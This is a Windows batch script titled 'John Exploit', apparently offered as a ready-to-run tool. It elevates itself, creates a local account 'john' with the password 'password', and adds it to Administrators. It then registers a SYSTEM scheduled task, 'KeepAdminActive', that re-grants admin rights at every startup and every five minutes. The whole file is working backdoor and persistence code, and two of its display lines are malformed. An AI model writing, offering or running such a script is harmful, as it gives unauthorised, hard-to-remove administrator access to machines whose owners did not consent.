@echo off
title John Exploit
:: Request Admin Privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)
cd /d "%~dp0"

@echo off
setlocal enabledelayedexpansion

:: ==========================================
:: Configuration
:: ==========================================
set "TARGET_USER=john"
set "TARGET_PASS=password"
set "LOGFILE=%~dp0admin_setup.log"

:: Set color scheme (Dark background with bright green text)
color 0A
cls

:: Check for Administrator Privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    color 0C
    echo ==========================================
    echo [-] ERROR: Administrator Rights Required
    echo ==========================================
    echo Please right-click this script and select 
    echo "Run as administrator".
    echo.
    pause
    exit /b
)

:: ==========================================
:: Interactive Main Menu
:: ==========================================
:MENU
cls
echo ==========================================
echo       Administrator Setup Utility
echo ==========================================
echo Target User : %TARGET_USER%
echo Log File    : %LOGFILE%
echo ==========================================
echo.
echo [1] Add User (Create user '%TARGET_USER%' with default password)
echo [2] Make User Admin (Configure admin privileges & persistence)
echo [3] Exit
echo.
set /p "choice=Select an option [1-3]: "

if "%choice%"=="1" goto ADD_USER
if "%choice%"=="2" goto MAKE_ADMIN
if "%choice%"=="3" exit /b

echo [!] Invalid selection. Please try again.
timeout /t 2 >nul
goto MENU


:: ==========================================
:: Option 1: Create User
:: ==========================================
:ADD_USER
cls
echo ==========================================
echo         Creating User Account
echo ==========================================
echo [%date% %time%] Attempting to create user '%TARGET_USER%'. > "%LOGFILE%"

net user %TARGET_USER% %TARGET_PASS% /add >nul 2>&1
if %errorlevel% equ 0 (
    echo [✔] User '%TARGET_USER%' successfully created with password '%TARGET_PASS%'.
    echo [%date% %time%] User '%TARGET_USER%' created successfully. >> "%LOGFILE%"
) else (
    echo [!] Note: User '%TARGET_USER%' may already exist or an error occurred.
    echo [%date% %time%] User creation skipped or failed (already exists?). >> "%LOGFILE%"
)

echo.
echo ==========================================
echo   How to Login:
echo   Click "Other user", set username to 
   .\john, and enter password "password"
echo ==========================================
echo.
echo Press any key to return to the menu...
pause >nul
goto MENU


:: ==========================================
:: Option 2: Configure Admin & Persistence
:: ==========================================
:MAKE_ADMIN
cls
echo ==========================================
echo      Configuring Administrator Rights
echo ==========================================
echo [%date% %time%] Setup started for user '%TARGET_USER%'. > "%LOGFILE%"

:: Step 1: Add User to Administrators
echo [1/3] Adding %TARGET_USER% to the Administrators group...
net localgroup Administrators %TARGET_USER% /add >> "%LOGFILE%" 2>&1
if %errorlevel% equ 0 (
    echo [✔] Successfully added %TARGET_USER% to Administrators.
) else (
    echo [!] Note: User may already be an administrator or an error occurred.
)

:: Step 2: Create Persistent Task Scheduler Setup
echo [2/3] Creating persistent scheduled task (Startup + Every 5 Mins)...
powershell -Command "$Action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c net localgroup Administrators %TARGET_USER% /add'; $TriggerStartup = New-ScheduledTaskTrigger -AtStartup; $TriggerMinute = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue); Register-ScheduledTask -TaskName 'KeepAdminActive' -Action $Action -Trigger @($TriggerStartup, $TriggerMinute) -RunLevel Highest -User 'NT AUTHORITY\SYSTEM' -Force" >> "%LOGFILE%" 2>&1

:: Step 3: Verification Step
echo [3/3] Verifying Task Scheduler and Group Status...
schtasks /query /tn "KeepAdminActive" >nul 2>&1
if %errorlevel% equ 0 (
    echo [✔] Task 'KeepAdminActive' verified and active.
    echo [%date% %time%] Setup completed successfully. >> "%LOGFILE%"
) else (
    echo [!] Warning: Task verification failed. Check log for details.
    echo [%date% %time%] Warning: Task verification failed. >> "%LOGFILE%"
)

echo.
echo ==========================================
echo   Configuration Complete! 
echo   Log saved to: %LOGFILE%
echo ==========================================
echo   How to Login:
echo   Click "Other user", set username to 
   .\john, and enter password "password"
echo ==========================================
echo.
pause
goto MENU

pause
